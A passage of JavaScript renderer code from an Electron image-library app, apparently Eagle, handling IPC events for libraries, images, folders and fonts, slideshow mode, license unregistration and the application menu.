                    $scope.libraryPathPermissionError = false;
                }

                if (process.platform === 'darwin') {
                    const isNTFS = (filePath) => {
                        try {
                            if (!filePath.startsWith('/Volumes/')) return '';
                            let volumePath = filePath.match(new RegExp(/\/Volumes\/(.+?)\//))[0];
                            if (!volumePath) return false;
                            const execSync = require('child_process').execSync;
                            let stdoutString;
                            try {
                                stdoutString = execSync(`diskutil info ${volumePath}`, {}, {
                                    timeout: 5000
                                }).toString();
                                if (stdoutString.toLowerCase().indexOf('ntfs') > -1 && stdoutString.toLowerCase().indexOf('exfat') === -1) {
                                    return true;
                                }
                                return false;
                            }
                            catch (err) {
                                return false;
                            }
                        }
                        catch (err) {
                            return false;
                        }
                    };
                    try {
                        let getDriveType = require(appRoot + '/my_modules/get-drive-type');
                        let driveType = getDriveType($scope.libraryPath).toLowerCase();
                        if (driveType.indexOf("ntfs") > -1 || driveType.indexOf("lifs") > -1) {
                            if (isVentura) {
                                $scope.showNTFSWarning = isNTFS($scope.libraryPath);
                            }
                            else {
                                $scope.showNTFSWarning = true;
                            }
                        }
                        else {
                            $scope.showNTFSWarning = false;
                        }
                    }
                    catch (err) {
                        electronLog && electronLog.error(err.stack || err);
                    }
                }

                // NOTE: 判斷是否為首次開啟，如果是，就顯示教學提示
                $scope.showTutorial();

                electronLog.info(`[app] Library loaded`);
            });

            ipcRenderer.on('keyword-suggestion', function(event, keywords) {
                if (keywords) {
                    $scope.globalKeywords = keywords;
                }
            });

            // Windows 右鍵開啟應用程式清單
            ipcRenderer.on('load-open-with', function(e, openWithInfo) {
                if (openWithInfo && openWithInfo["png"]) {
                    openWithInfo["jpg"] = openWithInfo["jpeg"];
                    $scope.openWithInfo = openWithInfo;
                    $scope.$evalAsync();
                }
            });

            ipcRenderer.on('library.changed', function(event, newLibrary) {

                var newFolders = newLibrary.folders;
                eagle.utils.tree.walk(newFolders, 'children', function(folder) {

                    if (!folder.children) {
                        folder.children = [];
                    }

                    if (folder && parent) {
                        folder.parent = parent.id;
                    }

                    if ($scope.folderMappings[folder.id]) {
                        folder.images = $scope.folderMappings[folder.id].images;
                        folder.isExpand = localStorage.getItem("eagle.sidebar.folder.expand." + folder.id) === "true";
                    }
                    $scope.folderMappings[folder.id] = folder;
                });

                $scope.libraryModificationTime = newLibrary.modificationTime;
                $scope.folders = newFolders;
                
                eagle.utils.tree.walk(newLibrary.smartFolders, 'children', function(smartFolder) {

                    if (!smartFolder.children) { smartFolder.children = []; }

                    if (smartFolder && parent) { smartFolder.parent = parent.id; }

                    if ($scope.smartFolderMappings[smartFolder.id]) {
                        smartFolder.isExpand = localStorage.getItem("eagle.sidebar.smartFolder.expand." + smartFolder.id) === "true";
                    }
                    $scope.smartFolderMappings[smartFolder.id] = smartFolder;
                });
                
                $scope.smartFolders = newLibrary.smartFolders || [];

                $scope.updateSidebarList();
                $scope.calculateImageBinding({  ignoreSort : true }, function() {
                    $scope.rebindRefresh();
                    $scope.$evalAsync();
                });
            });

            ipcRenderer.on('image.added', function(event, newImage) {
                if (!$scope.raw) return;
                if (newImage && newImage.id && newImage.ext) {

                    // 避免重复添加
                    if (newImage.id && $scope.itemMappings[newImage.id]) {
                        return;
                    }

                    if ($scope.raw) { $scope.raw.unshift(newImage); }
                    // 判斷是否需要更新畫面，如果 groupkey 屬於前 3 頁面，就更新
                    var key = ig.getGroupKeys(false)[0] - 1000000;
                    var needUpdateView = key <= 1;
                    $scope.startCursor = 0;
                    $scope.prependImages([newImage], needUpdateView);
                    $scope.calculateImageBinding({ ignoreSort : false }, function () {
                        muteRebind();
                        $scope.updateSelection();
                    });
                }
                $scope.$evalAsync();
            });

            ipcRenderer.on('image.removed', function(event, id) {

                if (!$scope.raw) return;
                for (var i = 0; i < $scope.raw.length; i++) {
                    var img = $scope.raw[i];
                    if (img.id === id) {
                        $scope.raw.splice(i, 1);
                        break;
                    }
                }

                // var itemElements = $scope.getSelectedItemElements();
                // $rootScope.$broadcast("gl:removeItems", itemElements);
                ig.remove($("#box-" + id)[0]);
                // items.forEach(function (item) {

                // });

                muteCalcuteImageBinding({ ignoreSort : true }, function() {
                    $scope.rebindRefresh(true);
                    $scope.updateSelection();
                    $scope.$evalAsync();
                });
            });

            ipcRenderer.on('image.palette.updated', function(event, newImage) {

                if (!$scope.raw) return;
                if (!newImage && newImage.palettes) return;

                $scope.updateItemView(newImage);

                var img = $scope.itemMappings[newImage.id];
                if (img && newImage.palettes) {
                    img.palettes = newImage.palettes
					if (newImage.modificationTime) {
						img.modificationTime = newImage.modificationTime;
					}
                    delete img.processingPalette;
                    return;
                }
                else if (img && img.processingPalette && !newImage.processingPalette) {
                    delete img.processingPalette;
                    return;
                }

                $scope.$evalAsync();
            });

            ipcRenderer.on('image.changed.mute', function(event, newImage) {

                if (!$scope.raw) return;

                var item = $("#box-" + newImage.id)[0];
                if (item && newImage.isDeleted) {
                    $rootScope.$broadcast("gl:removeItems", [item]);
                }
                else {
                    $scope.updateItemView(newImage);
                }
                $scope.$evalAsync();

                var img = $scope.itemMappings[newImage.id];
                if (img) {
                    angular.extend(img, newImage);
                    delete img.processingPalette;
                    muteRebind();
                    return;
                }
            });

            ipcRenderer.on('image.changed', function(event, newImage) {
                if (!$scope.raw) return;

                console.log("image.changed");

                var hashID = getHashID(newImage);

                var item = $("#box-" + newImage.id)[0];
                if (item && newImage.isDeleted) {
                    $rootScope.$broadcast("gl:removeItems", [item]);
                }
                else {
                    $scope.updateItemView(newImage);
                }
                hiddenByCurrentFilter([item]);

                var img = $scope.itemMappings[newImage.id];
				if (img && newImage && img.id === newImage.id) {
					angular.extend(img, newImage);
					img.star = newImage.star;
					delete img.processingPalette;
				}

                $scope.updateSelection();

                muteCalcuteImageBinding({ ignoreSort : true }, function() {
                    $scope.rebindRefresh(true);
                    $scope.updateSelection();
                    $scope.$evalAsync();
                });
            });

            ipcRenderer.on('show-and-search', function(e) {
                currentWindow.show();
                currentWindow.focus();
                $scope.searchInAll();
                $scope.$evalAsync();
            });

            ipcRenderer.on('filter-folder', function(event) {
                $scope.$evalAsync(function() {
                    $("#folder-search").focus();
                });
            });

            ipcRenderer.on('move-to-folders', function(event) {
                $scope.moveToFolders(event);
                $scope.$evalAsync();
            });

            ipcRenderer.on('rebind-refresh', function(e) {
                $scope.rebindRefresh();
                $scope.scrollToSelectedItem();
            });

            ipcRenderer.on('open-item', function(e, itemId) {
                let item = $scope.itemMappings[itemId];
                if (item) {
                    var folders = item.folders;
                    if (folders && folders.length > 0) {
                        var firstFolder = $scope.folderMappings[folders[0]];
                        $scope.openFolder(firstFolder);
                        setTimeout(function () { $scope.changeSidebarIndex(firstFolder); $scope.$evalAsync(); }, 200);
                    }
                    else {
                        $scope.openAll();
                    }
                    $scope.selected = [];
                    $timeout(function () {
                        $scope.select(undefined, item);
                        $scope.enterDetailMode(e, item);
                        $scope.scrollToSelectedItem();
                    }, 250);
                    $scope.$evalAsync();
                    if (currentWindow.isMinimized()) {
                        currentWindow.restore();
                    }
                    currentWindow.show();
                    currentWindow.focus();
                }
            });

            ipcRenderer.on('go-folder', function(e, folderId) {
                let folder = $scope.folderMappings[folderId];
                if (folder) {
                    $scope.openFolder(folder);
                    setTimeout(function () { $scope.changeSidebarIndex(folder); $scope.$evalAsync(); }, 200);
                    $scope.$evalAsync();
                    if (currentWindow.isMinimized()) {
                        currentWindow.restore();
                    }
                    currentWindow.show();
                    currentWindow.focus();
                }
            });

            ipcRenderer.on('go-smart-folder', function(e, smartFolderId) {
                let smartFolder = $scope.smartFolderMappings[smartFolderId];
                if (smartFolder) {
                    $scope.openSmartFolder(smartFolder);
                    setTimeout(function () { $scope.changeSidebarIndex(smartFolder); $scope.$evalAsync(); }, 200);
                    $scope.$evalAsync();
                    if (currentWindow.isMinimized()) {
                        currentWindow.restore();
                    }
                    currentWindow.show();
                    currentWindow.focus();
                }
            });

            ipcRenderer.on('add-history-tag', function(e, tag) {
                TagManager.addHistoryTag(tag);
                TagManager.save();
                $scope.$evalAsync();
            });

            ipcRenderer.on('add-history-tags', function(e, tags) {
                TagManager.addHistoryTags(tags);
                $scope.$evalAsync();
            });

            ipcRenderer.on('clear-history-tag', function(e, tag) {
                TagManager.historyTags = [];
                $scope.availableHistoryTags = [];
                TagManager.save();
                $scope.$evalAsync();
            });

            ipcRenderer.on('prepend-folder', function(e, folder) {
                $scope.prependFolder(folder);
                $scope.$evalAsync();
            });

            ipcRenderer.on('new-folder', function(e) {
                $scope.newFolder();
                $scope.$evalAsync();
            });

            ipcRenderer.on('new-smart-folder', function(e) {
                $scope.newSmartFolder();
                $scope.$evalAsync();
            });

            $scope.toggleSlideshow = function () {
                if (!$scope.isSlideshowMode) {
                    $scope.enterSlideshowMode();
                } else {
                    $scope.leaveSlideshowMode();
                }
            };

            $scope.enterSlideshowMode = function () {
                if ($scope.isSlideshowMode) return;
                const duration = (process.platform === 'darwin') ? 300 : 100;
                if (!$scope.selected.length === 0) return;
                currentWindow.setFullScreen(true);
                $scope.enterDetailMode(null, $scope.selected[0]);
                $scope.isSlideshowMode = true;
                $timeout(function() {
                    $(window).trigger("orientationchange");
                    $(window).trigger("resize");
                    $timeout(function () {
                        $scope.zoom(undefined);
                    }, duration);
                }, 700);
                electronLog && electronLog.info(`[app] Enter slideshow mode.`);   
            };

            $scope.leaveSlideshowMode = function () {
                const duration = (process.platform === 'darwin') ? 300 : 100;
                currentWindow.setFullScreen(false);
                $scope.isSlideshowMode = false;
                currentWindow.setFullScreen(false);
                $timeout(function() {
                    $(window).trigger("orientationchange");
                    $(window).trigger("resize");
                    $timeout(function () {
                        $scope.zoom(undefined);
                    }, duration);
                }, 700);
                electronLog && electronLog.info(`[app] Leave slideshow mode.`);
            };

            currentWindow.on('enter-full-screen', function () {
                $("body").addClass("fullscreen");
            });

            currentWindow.on('leave-full-screen', function () {
                var duration = 100;
                if (process.platform === 'darwin') {
                    duration = 500;
                }
                if ($scope.isDetailMode) {
                    $timeout(function () {
                        $scope.zoom(undefined);
                    }, duration);
                }
                $("body").removeClass("fullscreen");
                if ($scope.isSlideshowMode) {
            		$scope.leaveSlideshowMode();
            		$scope.$evalAsync();
            	}
            });

            ipcRenderer.on('hide-upload-queue', function () {
                if ($scope.uploadQueue.length === 0) { 
                    $scope.hideUploadQueue();
                    $scope.$evalAsync();
                }
            });

            ipcRenderer.on('open-and-reveal-image', function(e) {
                if ($scope.lastestAddItem) {
                    var image = $scope.lastestAddItem;
                    var folders = $scope.lastestAddItem.folders;
                    if (folders && folders.length > 0 && folders[0] && $scope.folderMappings[folders[0]]) {
                        $scope.openFolder($scope.folderMappings[folders[0]]);
                        $scope.selected = [];
                        $timeout(function () {
                            $scope.select(undefined, image);
                            $scope.scrollToSelectedItem();
                        }, 500);
                    }
                    else {
                        $scope.openAll();
                        $scope.selected = [];
                        $timeout(function () {
                            $scope.select(undefined, image);
                            $scope.scrollToSelectedItem();
                        }, 500);
                    }
                }
                else {
                    $scope.selected = [];
                    $scope.openAll();
                }
                $scope.$evalAsync();
            });

            ipcRenderer.on('power-suspend', function(event) {
            	try {
			    	ipcRenderer.send('electron-info', "[app] stop api server");
			    	if (APIServer) APIServer.stop();
			    }
			    catch (err) {
					electronLog && electronLog.error(err.stack || err);
			    }
			});

			ipcRenderer.on('power-resume', function(event) {
			    try {
			    	ipcRenderer.send('electron-info', "[app] start api server");
			    	if (APIServer) APIServer.start();
                    $(window).trigger("resize");
			    }
			    catch (err) {
					electronLog && electronLog.error(err.stack || err);
			    }
			});

            ipcRenderer.on('window-close', function (e) {
                if ($scope.isDetailMode) {
                    var video = $(".detail-wrap video")[0];
                    if (video && !video.paused) { video.pause(); }
                }
            })

            ipcRenderer.on('open-preferences', function(e, params) {
                if ($rootScope.isAppLocked) return;
                ipcRenderer.send('open.preferences', params);
            });

            ipcRenderer.on('toggle-slideshow', function(e) {
                $scope.toggleSlideshow();
                $scope.$evalAsync();
            });

            ipcRenderer.on('leave-slideshow', function(e) {
                $scope.$evalAsync();
            });

            ipcRenderer.on('show-sidebar-badge', function(e) {
                $rootScope.preferences.general.showSidebarBadge = true;
                $scope.$evalAsync();
            });

            ipcRenderer.on('hide-sidebar-badge', function(e) {
                $rootScope.preferences.general.showSidebarBadge = false;
                $scope.$evalAsync();
            });

            ipcRenderer.on('import-folders', function(e) {
                $scope.importFolders();
                $scope.$evalAsync();
            });

            ipcRenderer.on('activate-font', function(e, item) {
                $scope.activateFont(item, {showNotify: false, updateView: true});
            });

            ipcRenderer.on('deactivate-font', function(e, item) {
                $scope.deactivateFont(item, {showNotify: false, updateView: true});
            });

            ipcRenderer.on('reveal-in-eagle', function(e, it) {

            	var item = $scope.itemMappings[it.id];
            	var folder;

            	if (!item) return;

            	if (item.folders && item.folders.length > 0) {
            		folder = $scope.folderMappings[item.folders[0]];
            	}

            	$scope.quickOpenFolder(folder, item);
            	$scope.$evalAsync();
            });

            ipcRenderer.on('update-item-view-by-id', function(e, id) {
                if ($scope.itemMappings[id]) {
                    var item = $scope.itemMappings[id];
                    delete item.activating;
                    delete item.deactivating;
                    $scope.updateItemView(item);
                    if (item.fontMetas && item.fontMetas.postScriptName) {
                        var key = Object.keys(item.fontMetas.postScriptName)[0];
                        var postScriptName = item.fontMetas.postScriptName && item.fontMetas.postScriptName[key];
                        if (installedFonts[`${postScriptName}_.${item.ext}`]) {
                            eagle.filter.filterCounts['fontActivated']['activated']++;
                            eagle.filter.filterCounts['fontActivated']['deactivated']--;
                        }
                        else {
                            eagle.filter.filterCounts['fontActivated']['activated']--;
                            eagle.filter.filterCounts['fontActivated']['deactivated']++;
                        }
                    }
                }
            });

            ipcRenderer.on('open-unregister', function(e) {

                function unregister ({email, licenseCode, machineID}, url, callback) {
                    $http.post(url, {
                        email: email,
                        licenseCode: licenseCode,
                        machineID: machineID,
                    }).then(function (data) {
                        electronLog && electronLog.info(`[app] Unregister successfully, email: ${$scope.email}`);
                        $timeout(function () {
                            var result = data.data;
                            try { ipcRenderer.send('electron-info', result); }
                            catch (err) {}
                            if (result.error !== undefined) {
                            }
                            else {
                                callback && callback();
                            }
                        });
                    }, function (response) {
                        callback({}, undefined);
                    });
                }

                $scope.$evalAsync(function() {
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${i18n.__("dialog.unregister.title")}</h4>
                                <p class="alert-desc">${i18n.__("dialog.unregister.desc")}</p>
                            </div>
                        `,

                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__('dialog.unregister.unregisterBtn'),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function () {

                        var email = Registration.license.email;
                        var params = {
                            email: Registration.license.email,
                            licenseCode: Registration.license.code,
                            machineID: machineID,
                        };

                        unregister(params, "https://cn.eagle.cool/unregister", function (err, data) {
                            if (err) {
                            	electronLog && electronLog.error(`[app] Can not access server: https://cn.eagle.cool/unregister`);
                                electronLog && electronLog.error(err.stack || err);
                                unregister(params, "https://en.eagle.cool/unregister", function (err) {
                                    if (err) {
                                    	electronLog && electronLog.error(`[app] Can not access server: https://en.eagle.cool/unregister`);
                                    	electronLog && electronLog.error(err.stack || err);
		                                unregister(params, "http://120.79.10.37/unregister", function (err) {
		                                    if (err) {
		                                    	electronLog && electronLog.error(`[app] Can not access server: http://120.79.10.37/unregister`);
		                                        electronLog && electronLog.error(err.stack || err);
		                                    }
		                                });
                                    }
                                });
                            }
                        });

                        Registration = {
                            activated: false,
                            expireDate: Date.now()
                        };

                        setTimeout(function () {
	                        ipcRenderer.send("remove-registration");
	                        $rootScope.initMenu();
	                        electronLog && electronLog.info(`[app] Unregister successfully, email: ${email}`);
                        }, 2000);
                    });
                });
            });

            ipcRenderer.on('get-current-folder', function(event) {
                $scope.$evalAsync(function() {
                    ipcRenderer.send("current-folder", $scope.currentFolder);
                });
            });

            ipcRenderer.on('get-recent-folders', function(event) {
            	var recentFolders = $scope.getRecentFolders();
            	ipcRenderer.send("get-recent-folders", recentFolders);
            });

            ipcRenderer.on('add-recent-folders', function(event, folders) {
            	$scope.addToRecentFolders(folders);
            });
        };

        $scope.remind = function () {
            ipcRenderer.send('open-registration', 'REGISTER');
        };

        $rootScope.initMenu = function (lib, enableds) {

            var preferences = $rootScope.preferences;

            var fullScreenAccelerator = "";
            var removeAccelerator = "";
            var removeFromFolderAccelerator = "";

            if (process.platform == 'darwin') {
                fullScreenAccelerator = "F5";
                removeAccelerator = 'CmdOrCtrl+Backspace';
                removeFromFolderAccelerator = 'CmdOrCtrl+Shift+Backspace';
            }
            else {
                fullScreenAccelerator = "F5";
                removeAccelerator = 'Delete';
                removeFromFolderAccelerator = 'Shift+Delete';
            }

            var library_menu = [{
                enabled: !$scope.isAppLocked,
                label: i18n.__('appmenu.library>create'),
                click: function () {
                    $scope.$evalAsync(function () {
                        $scope.createLibrary();
                    });
                }
            }, {
                enabled: !$scope.isAppLocked,
                label: i18n.__('appmenu.library>load'),
                click: function () {
                    $scope.$evalAsync(function () {
                        $scope.importLibrary();
                    });
                }
            },
            { type: 'separator' }
            ];

            var dockMenu = [];
            var normalizeHistory = [];

            if (!$scope.isAppLocked) {
                libraryHistory = electronSettings.getSync('libraryHistory') || [];

                libraryHistory.forEach(function (history) {
                    if (history) {
                        normalizeHistory.push(path.normalize(history).replace(/\\$/g, "").replace(/\/$/, ""));
                    }
                });
                libraryHistory = [...new Set(normalizeHistory)];
                $scope.libraryHistory = libraryHistory;

                libraryHistory.forEach(function (history) {
                    var isCurrent = false;
                    if ($scope.libraryPath) {
                        isCurrent = path.normalize(history) == path.normalize($scope.libraryPath);
                    }
                    var libraryName = path.basename(history).replace('.library', '');
                    var libraryPath = path.dirname(history).replace(/\\$/g, "").replace(/\/$/, "");
                    if (libraryPath[0] === "/") { libraryPath = libraryPath.substr(1); }
                    var historyMenuItem = {
                        type: "checkbox",
                        checked: isCurrent,
                        enabled: !isCurrent,
                        icon: path.normalize(__dirname + "/images/context-library.png"),
                        label: `${libraryName} (${libraryPath})`,
                        click: function () {
                            $scope.openLibrary(path.normalize(history));
                        }
                    };
                    library_menu.push(historyMenuItem);
                    dockMenu.push(historyMenuItem);
                });

                if (libraryHistory || libraryHistory.length > 0) {
                    library_menu.push({ type: 'separator' });
                }

                library_menu.push({
                    label: i18n.__('appmenu.library>clearHistory'),
                    click: function () {
                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__('Dialog.Clear.Library.Title')}</h4>
                                    <p class="alert-desc">${i18n.__('Dialog.Clear.Library.Description')}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("Dialog.Clear.Library.Clear"),
                            cancelButtonText: i18n.__("general.cancel"),
                        }).then(function () {
                            electronSettings.setSync('libraryHistory', [path.normalize(decodeURIComponent($scope.rootDir))]);
                            $rootScope.initMenu();
                            electronLog && electronLog.info(`[app] Emptying the library history`);
                        });
                    }
                });

                library_menu.push({
                    label: i18n.__('appmenu.library>reload'),
                    click: function () {
                    	swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__("dialog.reloadLibrary.title")}</h4>
                                    <p class="alert-desc">${i18n.__("dialog.reloadLibrary.desc")}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("dialog.reloadLibrary.button"),
                            cancelButtonText: i18n.__("general.cancel"),
                        }).then(function () {
                            IPCHelper.send('reload-without-cache');
                        });
                    }
                });

                library_menu.push({ type: 'separator' });

                library_menu.push({
                    label: i18n.__('appmenu.library>merge'),
                    click: function () {
                        importLibraryData();
                        $scope.$evalAsync();
                    }
                });
            }

            // 创建 dock menu (macOS only)
            if (process.platform == 'darwin') {
                app.dock.setMenu(Menu.buildFromTemplate(dockMenu));
            }

            var helpMenuItem = {
                label: i18n.__('appmenu.help'),
                role: 'help',
                submenu: [
                    {
                        label: i18n.__('appmenu.help>shortcuts'),
                        click() {
                            $scope.openShortcuts();
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__('appmenu.help>helpCenter'),
                        click() {
                            $scope.openHelpCenter();
                        }
                    },
                    {
                        label: i18n.__('appmenu.help>openTips'),
                        click() {
                            $scope.openGetStarted();
                        }
                    },
                    {
                        label: i18n.__('appmenu.help>installExtension'),
                        click() {
                            electron.shell.openExternal('https://eagle.cool/extensions')
                        }
                    },
                    {
                        type: 'separator'
                    },
                    {
                        label: i18n.__('appmenu.help>feedback'),
                        click() {
                            if (preferences.general.language === 'zh_CN') {
                                electron.shell.openExternal('https://docs-cn.eagle.cool/?contactModal=true')
                            }
                            else {
                                electron.shell.openExternal('https://docs-en.eagle.cool/?contactModal=true')
                            }
                        }
                    },
                    {
                        label: i18n.__('appmenu.help>license-retrieval'),
                        click() {
                            electron.shell.openExternal('https://eagle.cool/license-retrieval');
                        }
                    },
                    {
                        type: 'separator'
                    },
                    {
                        label: i18n.__('appmenu.help>changelogs'),
                        click() { 
                            if (preferences.general.language === 'zh_CN') {
                                electron.shell.openExternal('https://trello.com/b/YgBOPQ6x/') 
                            }
                            else {
                                electron.shell.openExternal('https://trello.com/b/LSsVep1d') 
                            }
                        }
                    },
                    {
                        label: i18n.__('appmenu.help>errorlogs'),
                        click: function () {
                            ipcRenderer.send('open-electron-log');
                        }
                    },
                    {
                        type: 'separator'
                    },
                    {
                        label: i18n.__('appmenu.help>debugReport'),
                        click: function () {
                            DebugReporter.save();
                        }
                    },
                ]
            }

            var colorSpaceMenuItem = {
                label: i18n.__('appmenu.app>colorSpace'),
                enabled: !$rootScope.isAppLocked,
                submenu: [
                    {
                        type: 'checkbox',
                        checked: $scope.colorSpace === "sRGB",
                        label: "sRGB",
                        click: function () {
                            if ($rootScope.isAppLocked) return;
                            ipcRenderer.send('change.colorSpace', 'sRGB');
                        }
                    },
                    {
                        type: 'checkbox',
                        checked: $scope.colorSpace === "DisplayP3",
                        label: "Display P3",
                        click: function () {
                            if ($rootScope.isAppLocked) return;
                            ipcRenderer.send('change.colorSpace', 'DisplayP3');
                        }
                    },
                    {
                        type: 'checkbox',
                        checked: $scope.colorSpace === "Unmanaged",
                        label: i18n.__('appmenu.app>colorSpace>Unmanaged'),
                        click: function () {
                            if ($rootScope.isAppLocked) return;
                            ipcRenderer.send('change.colorSpace', 'Unmanaged');
                        }
                    },
                ]
            };

            var pasteItem = {
                label: i18n.__('appmenu.edit>paste'),
                role: 'paste'
            };

            var autoImportSubmenu = [{
    			label: i18n.__("appmenu.file>autoImport>settings"),
    			click: function () {
    				ipcRenderer.send('open.preferences', {
    					panel: "autoImport"
    				});
    			}
    		}];
    		if ($rootScope.preferences.autoImport.enable === 'true' && $rootScope.preferences.autoImport.path) {
    			autoImportSubmenu.push({
    				label: $rootScope.preferences.autoImport.path,
    				click: function () {
    					ipcRenderer.send('open-with-default', $rootScope.preferences.autoImport.path);
    				}
    			});
    		}

            var autoImportMenuItem = new MenuItem({
            	label: i18n.__("appmenu.file>autoImport"),
            	submenu:autoImportSubmenu
            });

            var application_menu = [
                {
                    label: i18n.__('appmenu.library'),
                    submenu: library_menu,
                },
                {
                    label: i18n.__("appmenu.file"),
                    submenu: [
                        {
                            label: i18n.__('appmenu.file>createFolder'),
                            accelerator: preferences.shortcuts.keybinds['create.folder'],
                            enabled: !$scope.isAppLocked,
                            click: function () { 
                                $scope.newFolder();
                                $scope.$evalAsync();    
                            }
                        },
                        {
                            label: i18n.__('context.folder.newSubFolder'),
                            accelerator: "Alt+N",
                            enabled: !$scope.isAppLocked,
                            click: function () { 
                                $scope.newSubFolder();
                                $scope.$evalAsync();    
                            }
                        },
                        {
                            label: i18n.__('appmenu.file>createSmartFolder'),
                            accelerator: preferences.shortcuts.keybinds['create.smartFolder'],
                            enabled: !$scope.isAppLocked,
                            click: function () {
                                $scope.newSmartFolder();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__("appmenu.file>folders"),
                            enabled: !$scope.isAppLocked,
                            click: function () {
                                $scope.importFolders();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.file>eaglepack'),
                            enabled: !$scope.isAppLocked,
                            click: function () {
                                dialog.showOpenDialog(currentWindow, {
                                    title: i18n.__("Dialog.Import.Eaglepack.Message"),
                                    filters: [
                                        { name: 'Eagle Pack', extensions: ['eaglepack'] },
                                    ],
                                    properties: ['openFile']
                                }).then(result => {
                                    var paths = result.filePaths;
                                    if (!paths || paths.length === 0) return;
                                    var packPath = paths[0];
                                    ipcRenderer.send("open-eaglepack", {
                                        path: packPath
                                    });
                                    console.log(result.canceled)
                                    console.log(result.filePaths)
                                }).catch(err => {
                                    console.log(err)
                                })
                            }
                        },
                        {
                            label: i18n.__("appmenu.file>others"),
                            submenu: [
                            	{
                                    label: "Pinterest",
                                    click: function () {
                                        $scope.openPinterest();
                                    }
                                },
                                {
                                    label: i18n.__("appmenu.file>others>artstation"),
                                    accelerator: preferences.shortcuts.keybinds['import.artstation'],
                                    enabled: !$scope.isAppLocked,
                                    click: function () {
                                        $scope.openArtstation();
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    type: 'separator'
                                },
                                {
                                    label: "Inboard",
                                    enabled: !$scope.isAppLocked,
                                    click: function () {
                                        dialog.showOpenDialog(currentWindow, {
                                            title: "Choose Inboard Backup Directory",
                                            filters: [],
                                            properties: ['openDirectory']
                                        }).then(result => {
                                            var paths = result.filePaths;
                                            if (paths && paths.length > 0) {
                                                var path = paths[0];
                                                ipcRenderer.send("import-inboard", path);
                                            }
                                        }).catch(err => {
                                            console.log(err)
                                        });
                                    }
                                },
                            ]
                        },
                        autoImportMenuItem,
                    ]
                }, {
                    label: i18n.__('appmenu.edit'),
                    visible: process.platform === 'darwin',
                    submenu: [
                        {
                            label: i18n.__('appmenu.edit>redo'),
                            role: 'redo',
                        },
                        {
                            label: i18n.__('appmenu.edit>undo'),
                            role: 'undo',
                        }, {
                            label: i18n.__('appmenu.edit>cut'),
                            role: 'cut',
                        },
                        {
                            label: i18n.__('appmenu.edit>copy'),
                            role: 'copy',
                        },
                        {
                            label: i18n.__('appmenu.edit>copyPath'),
                            accelerator: 'CmdOrCtrl+Alt+C',
                            click: function () {
                                $scope.copyAsPath();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('context.image.copyAsFolderPath'),
                            accelerator: 'CmdOrCtrl+Alt+Shift+C',
                            click: function () {
                                $scope.copyAsFolderPath();
                                $scope.$evalAsync();
                            }
                        },
                        pasteItem,
                        {
                            label: i18n.__("context.image.clone"),
                            accelerator: 'CmdOrCtrl+D',
                            click: function () {
                                $scope.duplicateItem();
                            }
                        },
                        {
                            label: i18n.__('appmenu.edit>selectAll'),
                            click: function (event) {
                                $scope.selectAll();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.edit>switchLibrary'),
                            accelerator: preferences.shortcuts.keybinds['switch.library'],
                            enabled: !$scope.isAppLocked,
                            click: function (event) { 
                                $scope.switchLibrary(event);
                                $scope.$evalAsync();    
                            }
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.edit>arrange'),
                            submenu: [
                                {
                                    label: i18n.__('appmenu.edit>arrange>top'),
                                    accelerator: 'Shift+CmdOrCtrl+]',
                                    enabled: !$scope.isAppLocked,
                                    click: function (event) {
                                        $scope.arrangeTopFolder();
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    label: i18n.__('appmenu.edit>arrange>up'),
                                    accelerator: 'CmdOrCtrl+]',
                                    enabled: !$scope.isAppLocked,
                                    click: function (event) {
                                        $scope.arrangeUpFolder();
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    label: i18n.__('appmenu.edit>arrange>bottom'),
                                    accelerator: 'Shift+CmdOrCtrl+[',
                                    enabled: !$scope.isAppLocked,
                                    click: function (event) {
                                        $scope.arrangeBottomFolder();
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    label: i18n.__('appmenu.edit>arrange>down'),
                                    accelerator: 'CmdOrCtrl+[',
                                    enabled: !$scope.isAppLocked,
                                    click: function (event) {
                                        $scope.arrangeDownFolder();
                                        $scope.$evalAsync();
                                    }
                                },
                            ]
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.edit>removeFromFolder'),
                            accelerator: removeFromFolderAccelerator,
                            enabled: !$scope.isAppLocked,
                            click: function (e) {
                                $scope.$evalAsync(function () {
                                    if ($scope.currentFolder) {
                                        $scope.removeFromFolder(e, $scope.currentFolder.id);
                                    }
                                });
                            }
                        },
                        {
                            label: i18n.__('appmenu.edit>moveToTrash'),
                            accelerator: removeAccelerator,
                            enabled: !$scope.isAppLocked,
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.removeSelected();
                                });
                            }
                        }]
                },
                {
                    label: i18n.__('appmenu.find'),
                    submenu: [
                        {
                            label: i18n.__('appmenu.find>search'),
                            accelerator: 'CmdOrCtrl+F',
                            click: function (event) {
                                $scope.$evalAsync(function () {
                                    $scope.focusSeach(event);
                                });
                            }
                        },
                        {
                            label: i18n.__('appmenu.find>searchAll'),
                            accelerator: 'CmdOrCtrl+Alt+F',
